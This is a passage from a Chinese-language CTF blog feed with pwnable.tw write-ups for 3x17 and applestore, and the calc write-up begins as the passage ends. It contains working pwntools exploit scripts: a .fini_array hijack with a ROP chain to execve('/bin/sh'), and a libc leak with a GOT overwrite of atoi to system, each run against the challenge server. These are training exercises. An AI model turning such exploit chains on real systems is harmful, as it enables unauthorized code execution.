punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h4 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h4><p>利用系统操作实现unlink，unsorted bin free的时候不会把pre_size位清零，然后 unsorted bin chunk free的时候会把fd和bk伪造好，那么这个大堆块就会和中间的一个小堆块实现重叠，那么UAF，double free之类的操作就方便很多了。</p><p>可以回顾这里：</p><blockquote><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/#null" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/#null</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnablele_exercises</title>
      <link href="/2020/01/30/pwnablele-exercises/"/>
      <url>/2020/01/30/pwnablele-exercises/</url>
      
        <content type="html"><![CDATA[<p>pwnable.tw不愧是誉为pwn手最爱的平台，题目很难，但是每一个题目都十分具有代表性，一句话：快乐很多，知识很多，哈哈！</p><h3 id="3x17"><a href="#3x17" class="headerlink" title="3x17"></a>3x17</h3><p>首先这是一个64位的elf文件，check结果如下：</p><pre><code>[*] &#39;/home/root0/pratice/pwnable/3x17/3x17&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>这个虽然没有开canary，但是程序自己实现了一个类似于canary效果的保护。<br>file结果如下：</p><pre><code>3x17: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=a9f43736cc372b3d1682efa57f19a4d5c70e41d3, stripped</code></pre><p>静态去符号属实恶心，自然首先尝试了一下lscan符号恢复，发现没啥卵用，那么就自己手动修复喽,main函数如下。</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  <span class="token keyword">char</span> <span class="token operator">*</span>v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST08_8</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-20h]</span>  <span class="token keyword">unsigned</span> __int64 v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+28h] [rbp-8h]</span>  v7 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token operator">++</span>byte_4B9330<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> byte_4B9330 <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">,</span> <span class="token string">"addr:"</span><span class="token punctuation">,</span> <span class="token number">5uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0x18uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sub_40EE70</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//讲输入的10进制地址转化给16进制的形式</span>    v5 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v4<span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">,</span> <span class="token string">"data:"</span><span class="token punctuation">,</span> <span class="token number">5uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> v5<span class="token punctuation">,</span> <span class="token number">0x18uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//可以向自己输入的地址里面读入0x18个字符</span>    result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">!=</span> v7 <span class="token punctuation">)</span>    <span class="token function">sub_44A3E0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>程序逻辑简单，但是涉及到了较深的知识。</p><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>.fini.array数组：这个数组里面存储这个程序执行完之后的函数，但是里面是逆序调用的，意思就是：假设.fini.array[0],.fini.array[1],.fini.array[2] 这三个里面存储着三个地址，那么就会下执行.fini.array[2],然后执行[1],最后执行.fini.array[0] .</p><h4 id="利用方式（exp）"><a href="#利用方式（exp）" class="headerlink" title="利用方式（exp）"></a>利用方式（exp）</h4><p>所以，我们可以把.fini.array[0]里面写入调用其所在函数的地址，然后把main函数的地址放入.fini.array[1]里面，进而实现无限循环，那么等byte_4B9330的值溢出再次成为1的时候，就可以再次任意地址写，多次任意写就可以用系统调用的方式实现getshell</p><img src="/2020/01/30/pwnablele-exercises/1.png" title="This is an image"><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> LibcSearcher<span class="token comment" spellcheck="true">#context.log_level = "debug"</span>local <span class="token operator">=</span> <span class="token number">0</span>exec_binary <span class="token operator">=</span> <span class="token string">'./3x17'</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> exec_binaryelf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>exec_binary<span class="token punctuation">,</span>checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">if</span> local<span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>exec_binary<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"chall.pwnable.tw"</span><span class="token punctuation">,</span><span class="token number">10105</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_libc</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>addr_name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> libc<span class="token punctuation">,</span>libcbase    libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span>str<span class="token punctuation">(</span>addr_name<span class="token punctuation">)</span><span class="token punctuation">,</span>addr<span class="token punctuation">)</span>    libcbase <span class="token operator">=</span> addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>addr_name<span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">confirm</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>    n <span class="token operator">=</span> globals<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> key<span class="token punctuation">,</span>value <span class="token keyword">in</span> n<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> value <span class="token operator">==</span> address<span class="token punctuation">:</span>            <span class="token keyword">return</span> success<span class="token punctuation">(</span>key<span class="token operator">+</span><span class="token string">" ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    break_point <span class="token operator">=</span> <span class="token string">'b *'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\nc'</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">,</span>break_point<span class="token punctuation">)</span>    pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#r.sendline(str(eval(str(addr))))</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span>fini_arry <span class="token operator">=</span> <span class="token number">0x0000000004B40F0</span>fini_func <span class="token operator">=</span> <span class="token number">0x000000000402960</span>main_addr <span class="token operator">=</span> <span class="token number">0x000000000401B6D</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000401696</span>pop_rsi_ret <span class="token operator">=</span> <span class="token number">0x0000000000406c30</span>pop_rax_ret <span class="token operator">=</span> <span class="token number">0x000000000041e4af</span>pop_rdx_ret <span class="token operator">=</span> <span class="token number">0x0000000000446e35</span>syscall_addr <span class="token operator">=</span> <span class="token number">0x0000000000471db5</span>bin_sh_addr <span class="token operator">=</span> <span class="token number">0x4B9300</span>leave_ret <span class="token operator">=</span> <span class="token number">0x000000000401C4B</span> write<span class="token punctuation">(</span>fini_arry<span class="token punctuation">,</span>p64<span class="token punctuation">(</span>fini_func<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>write<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">,</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span>write<span class="token punctuation">(</span>fini_arry<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>write<span class="token punctuation">(</span>fini_arry<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>write<span class="token punctuation">(</span>fini_arry<span class="token operator">+</span><span class="token number">0x30</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>write<span class="token punctuation">(</span>fini_arry<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">59</span><span class="token punctuation">)</span><span class="token punctuation">)</span>write<span class="token punctuation">(</span>fini_arry<span class="token operator">+</span><span class="token number">0x50</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>syscall_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>write<span class="token punctuation">(</span>fini_arry<span class="token punctuation">,</span>p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''rop = [    pop_rax_ret,    p64(59),    pop_rdi_ret,    p64(59),]'''</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="applestore-—-gt-栈空间复用"><a href="#applestore-—-gt-栈空间复用" class="headerlink" title="applestore   —&gt; 栈空间复用"></a>applestore   —&gt; 栈空间复用</h3><p>看了libc就知道是个32位的题目，先checksec走一波。</p><pre><code>[*] &#39;/home/root0/pratice/pwnable/applestore/applestore&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>可以看到开启了NX和Canary保护。下面分析程序的主要功能：<br>这是个苹果购买系统。</p><img src="/2020/01/30/pwnablele-exercises/2.png" title="This is an image"><p>add函数就是类似于加入购物车的操作，其中存储数据结果为双链表的形式：</p><pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> order<span class="token punctuation">{</span>    <span class="token keyword">void</span> <span class="token operator">*</span>description_ptr<span class="token punctuation">;</span>    <span class="token keyword">int</span> price<span class="token punctuation">;</span>    <span class="token operator">*</span>fd<span class="token punctuation">;</span>    <span class="token operator">*</span>bk<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>下面看一下delete函数<br><img src="/2020/01/30/pwnablele-exercises/3.png" title="This is an image"></p><p>可以看到delete函数实现了类似于unlink的功能，把要删除的节点从链表里面拆除出来。</p><p>下面比较重要的就是checkout函数了：<br><img src="/2020/01/30/pwnablele-exercises/4.png" title="This is an image"></p><p>可以看到如果购物达到一定的数量会以1美元的价格赠送一个iphone 8,漏洞就在于此函数的insert()操作，这个操作此时在栈上进行，但是栈上的这块区域会被很main函数里面的很多函数复用，这就使得我们有可能改造这个iphone 8的结构体（这波操作属实秀我一脸，不看wp根本想不到好嘛？也可能是我太菜了），我们改造iphone 8结构体之后可以实现地址泄露和类似于任意地址写的操作，这样的话之后就是常规的想办法Getshell的操作了。</p><h4 id="利用点"><a href="#利用点" class="headerlink" title="利用点"></a>利用点</h4><ol><li>这个程序的delete函数实现了类似于unlink的功能，那么我们也可以利用类似于unlink在无保护时的写入漏洞来时实现任意地址写入，这一点属实是秀到炸了，这是一个好题，嗯就是这样。</li><li>我们可以用environ环境变量指针来泄露出栈地址，那么unlink就可以用来修改main_ret来实现getshell。</li><li>交换GOT和ebp,从而子函数ret后回到main,ebp会到GOT上,在main中read,会读到GOT表上,可以改写atoi到system，这简直就是天秀！！！</li></ol><p><strong>EXP</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">""</span>chall<span class="token punctuation">.</span>pwnable<span class="token punctuation">.</span>tw<span class="token string">",10104"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">confirm</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>    n <span class="token operator">=</span> globals<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> key<span class="token punctuation">,</span>value <span class="token keyword">in</span> n<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> value <span class="token operator">==</span> address<span class="token punctuation">:</span>            <span class="token keyword">return</span> success<span class="token punctuation">(</span>key<span class="token operator">+</span><span class="token string">" ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">list_order</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Number> "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>flag<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Number> "</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> flag<span class="token punctuation">:</span>        r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">list_cart</span><span class="token punctuation">(</span>payload<span class="token operator">=</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"(y/n) > "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"y"</span><span class="token operator">+</span>payload<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">checkout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"5"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"(y/n) > "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"y"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc_32.so.6"</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>checkout<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"\x00"</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"atoi"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x804b070</span><span class="token punctuation">)</span>list_cart<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"27: "</span><span class="token punctuation">)</span>atoi_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"28: "</span><span class="token punctuation">)</span>heap_base <span class="token operator">=</span> u32<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x490</span>confirm<span class="token punctuation">(</span>atoi_addr<span class="token punctuation">)</span>confirm<span class="token punctuation">(</span>heap_base<span class="token punctuation">)</span>libcbase <span class="token operator">=</span> atoi_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"atoi"</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#get_libc(atoi_addr,"atoi")</span>confirm<span class="token punctuation">(</span>libcbase<span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>confirm<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>environ_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"environ"</span><span class="token punctuation">]</span>confirm<span class="token punctuation">(</span>environ_addr<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#puts_got = elf.got["puts"]</span>payload <span class="token operator">=</span> <span class="token string">"\x00"</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>environ_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#debug(0x8048B34)</span>list_cart<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"27: "</span><span class="token punctuation">)</span>stack_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x104</span> <span class="token operator">//</span>找到delete函数的confirm<span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"27"</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>environ_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>stack_addr <span class="token operator">-</span> <span class="token number">0xc</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"atoi"</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">0x20</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#这个没有\x00截断，但是你调试就可以发现其实没关系。atoi函数会把地址所指向的字符串当做参数并且只解析可以解析的，到不可解析为止。</span>delete<span class="token punctuation">(</span>payload<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'$0\x00\x00'</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><p>倒数第二个payload的got为啥 +0x20-2<br><img src="/2020/01/30/pwnablele-exercises/5.png" title="This is an image"></p><p>知道了吧。。。</p><p>还有就是$0也可以代替”/bin/sh”这类字符串来作为system的参数实现Getshell。</p><blockquote><p><a href="http://www.ainesmile.com/unix/2018/01/22/environment-variables.html" target="_blank" rel="noopener">http://www.ainesmile.com/unix/2018/01/22/environment-variables.html</a>  environ环境变量指针</p></blockquote><h3 id="pwnable-tw-calc"><a href="#pwnable-tw-calc" class="headerlink" title="pwnable.tw  calc"></a>pwnable.tw  calc</h3><p>这个题目是一个逻辑漏洞的考验，着重考验的是代码逆向水平和代码审计的能力。<br>我们看关键函数calc</p><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">calc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+18h] [ebp-5A0h]</span>  <span class="token keyword">int</span> v2<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-59Ch]</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1ACh] [ebp-40Ch]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+5ACh] [ebp-Ch]</span>  v4 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">bzero</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0x400u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">get_expr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>             <span class="token comment" spellcheck="true">// 数值存储</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token function">init_pool</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>                             <span class="token comment" spellcheck="true">// 栈清0</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">parse_expr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">)</span> <span class="token punctuation">)</span>             <span class="token comment" spellcheck="true">// 算术计算</span>    <span class="token punctuation">{</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_80BF804<span class="token punctuation">,</span> v2<span class="token punctuation">[</span>v1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v4<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>其中函数bzero和init_pool都是将一段栈空间清0，函数get_expr存储我们的算术表达式放入bzero函数开辟的空间，存储运算结果在init_pool函数开辟的空间，关键的是在于parse_expr函数，这里进行运算。</p><pre class=" language-c"><code class="language-c"><span class="token keyword">signed</span> <span class="token keyword">int</span> __cdecl <span class="token function">parse_expr</span><span class="token punctuation">(</span><span class="token keyword">int</span> buf_s<span class="token punctuation">,</span> _DWORD <span class="token operator">*</span>new_buf<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST2C_4</span>  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  <span class="token keyword">int</span> buf_s_<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+20h] [ebp-88h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+24h] 